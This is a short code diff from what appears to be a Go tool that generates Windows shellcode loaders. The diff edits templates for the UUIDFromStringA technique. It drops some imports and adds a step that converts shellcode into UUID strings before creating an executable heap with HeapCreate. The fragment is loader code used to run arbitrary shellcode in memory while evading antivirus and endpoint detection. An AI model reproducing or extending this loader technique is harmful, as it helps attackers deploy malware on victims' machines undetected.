@@ -6,11 +6,11 @@ const UUIDFromStringAImports = `
 	"encoding/binary"
 	"fmt"
 	"log"
-	"os"
-	"time"
+	
+	
 	"unsafe"
 
-	"github.com/salukikit/go-util/pkg/box"
+	
 
 	// Sub Repositories
 	"golang.org/x/sys/windows"
@@ -31,6 +31,12 @@ const UUIDFromStringADlls = `
 `
 
 const UUIDFromStringA = `
+
+	uuids, err := shellcodeToUUID(shellcode)
+	if err != nil {
+		log.Fatal(err.Error())
+	}
+
 	heapAddr, _, err := heapCreate.Call(0x00040000, 0, 0)
 	if heapAddr == 0 {
 		log.Fatal(fmt.Sprintf("there was an error calling the HeapCreate function:\r\n%s", err))
